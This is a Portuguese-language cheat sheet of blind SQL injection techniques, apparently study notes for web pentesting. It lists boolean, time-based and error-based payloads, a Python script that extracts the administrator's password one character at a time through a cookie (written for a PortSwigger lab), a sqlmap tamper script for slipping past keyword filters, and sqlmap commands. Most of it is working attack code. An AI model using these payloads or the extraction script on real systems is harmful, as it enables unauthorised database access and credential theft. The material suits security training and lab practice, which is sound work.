:hamburger:Basicamente uma aplicação é vulnerável a Blind SQL Injection quando não retorna nenhum resultado como resposta aos códigos SQL injetados. Neste cenário, códigos contendo UNION não são efetivos, e é necessário usar códigos condicionais para extrair informações da base de dados. 

:fries:Checklist

- Boolean-based Blind SQLi
<p>Se a aplicação mudar a resposta ao enviar uma sentença falsa, isso é um indício de que a aplicação está vulnerável.</p>

```
' AND 1=1 -- - (true)
' AND 1=2 -- - (false)
```
- Time-based Blind SQLi
<p>Códigos com 'SLEEP' ou 'BENCHMARCK' forçam a base de dados a esperar 10 segundos quando a condição é verdadeira. Se a resposta tiver um delay de 10 segundos (ou outro valor adicionado ao comando), isso indica que o payload funcionou, e a aplicação está vulnerável. </p>

```
/* Multicontext */
SLEEP(10)
SLEEP(10) /*' or SLEEP(10) or '" or SLEEP(10) or "*/

/* MySQL only */
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```
- Error-based Blind SQLi
<p>Apesar do Blind SQL Injection não retornar uma mensagem de erro convencional, quando usamos CASE para testar uma condição, podemos obter o retorno de "strings", e fazer o mapeamento de informações a partir dessa resposta. </p>

```
 ' OR (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT database()),1,1)) = 'a') THEN CAST('' AS INT) ELSE 'a' END) -- ';
 
 select substring(database(),1,1)
 
 ' and substring(@@version,1,1)='[valor-para-testar]
```
### Burp Suite to exploit Blind SQLi
<p>Instale a extensão "Copy as Python-Requests" do Burp Suite e use a requisição para realizar a exploração do Blind SQL Injection. Verifique os seguintes comportamentos: 
- É possível disparar uma consulta DNS? Esse pode ser um indício de que a aplicação é vulnerável a Blind SQL Injection.
- Use o SQLMap com a técnica ```--technique=B```
 
Script de exemplo para exploração do Blind SQLi com respostas condicionais.</p>
Burp Lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
<br></br>

```
import requests
import string

burp0_url = "https://[host]"
burp0_cookies = {"TrackingId": "2OhtAv5umLt0e9Yg", "session": "2yNubi9Et3RQFcH4WCBFiX3LO8RurQ21"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://0ae100df03b5e2d68630f39d00cd0013.web-security-academy.net/filter?category=Gifts", "Dnt": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}

char_set = string.ascii_lowercase + string.digits
password = ''

for position in range(1,21):
    for char in char_set:
        burp0_cookies["TrackingId"] = f"2OhtAv5umLt0e9Yg' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username = 'administrator')='{char}"
        print(f"Testando: {position}:{char}")
        response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

        if "Welcome" in response.text:
            print(f"Found {position}:{char}")
            password += char
            break
print(f"Pass: {password}")
```
### Script para bypass de filtro de palavras 
<p>Use o script abaixo com a opção Tamper do SQLMap</p>

```
#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces each keyword a CaMeLcAsE VeRsIoN of it.

    >>> tamper('INSERT')
    'InSeRt'
    """

    retVal = str()

    if payload:
        for i in xrange(len(payload)):
            if (i % 2 == 0):
                # We cannot break 0x12345
                if not ((payload[i] == 'x') and (payload[i-1] == '0')):
                    retVal += payload[i].upper()
                else:
                    retVal += payload[i]
            else:
                retVal += payload[i].lower()
    return retVal
```
#### Execução do script 
```
sqlmap -u 'http://[URL]/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/camelcase.py --prefix="nonexistent'" --suffix=';#' --union-char=els --banner
```
#### Sempre verifique os seguintes comportamentos: 
- É possível disparar uma consulta DNS? Esse pode ser um indício de que a aplicação é vulnerável a Blind SQL Injection.
- Use o SQLMap com a técnica ```--technique=B```
- Teste o Blind SQLi usando a extração de caracteres e a extração da versão da base de dados:
```AND (SELECT SUBSTRING(version(),1,1))='5'```

#### :orange_book: Site para testar códigos SQL: https://www.db-fiddle.com/
#### :orange_book: Portswigger Cheatsheet para SQL Injection: https://portswigger.net/web-security/sql-injection/cheat-sheet

